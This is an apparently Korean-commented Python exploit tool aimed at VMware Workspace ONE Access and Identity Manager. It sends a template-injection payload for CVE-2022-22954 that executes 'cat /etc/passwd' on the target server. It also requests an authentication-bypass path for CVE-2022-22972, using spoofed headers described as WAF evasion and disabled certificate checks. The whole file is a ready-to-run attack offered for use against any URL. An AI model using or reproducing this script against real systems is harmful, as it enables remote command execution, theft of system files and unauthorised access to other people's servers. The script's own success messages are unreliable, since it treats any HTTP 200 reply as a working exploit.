import requests
import argparse
import base64
import urllib.parse
import warnings
from urllib.parse import urlparse

# SSL 경고 무시
warnings.simplefilter('ignore', category=UserWarning)

# HTTP 요청 헤더 변조 (WAF 우회)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "https://google.com",
    "X-Forwarded-For": "127.0.0.1"
}

# CVE-2022-22954 Exploit
def exploit_cve_2022_22954(target_url):
    try:
        # 페이로드 정의
        payload = "/catalog-portal/ui/oauth/verify?error=&deviceUdid=${\"freemarker.template.utility.Execute\"?new()(\"cat /etc/passwd\")}"
        exploit_url = f"{target_url}{payload}"

        response = requests.get(exploit_url, headers=HEADERS, verify=False, allow_redirects=False, timeout=10)
        
        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text[:500])  # 응답이 길 경우 일부 출력

        if response.status_code == 200:
            print("[SUCCESS] CVE-2022-22954 Exploit successful!")
            print("Server Response:")
            print(response.text[:500])  # 응답이 너무 길 경우 앞 500자 출력
        else:
            print("[FAIL] CVE-2022-22954 Exploit failed. Check target and parameters.")

    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# CVE-2022-22972 Exploit
def exploit_cve_2022_22972(target_url):
    try:
        # 페이로드 정의
        payload = "/SAAS/t/_/;/auth/login/embeddedauthbroker/callback"
        exploit_url = f"{target_url}{payload}"

        response = requests.get(exploit_url, headers=HEADERS, verify=False, allow_redirects=False, timeout=10)

        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text[:500])  # 응답이 길 경우 일부 출력

        if response.status_code == 200:
            print("[SUCCESS] CVE-2022-22972 Exploit successful!")
            print("Potentially bypassed authentication.")
            print("Server Response:")
            print(response.text[:500])  # 응답이 너무 길 경우 앞 500자 출력
        else:
            print("[FAIL] CVE-2022-22972 Exploit failed. Check target and parameters.")

    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# 메인 함수
def main():
    parser = argparse.ArgumentParser(
        description="VMware Workspace ONE & Identity Manager Exploit Tool",
        usage="python3 exploit.py --url <URL>"
    )
    parser.add_argument("--url", required=True, help="Target URL")

    args = parser.parse_args()

    print("[INFO] Attempting exploitation...")
    exploit_cve_2022_22954(args.url)
    exploit_cve_2022_22972(args.url)

if __name__ == "__main__":
    main()
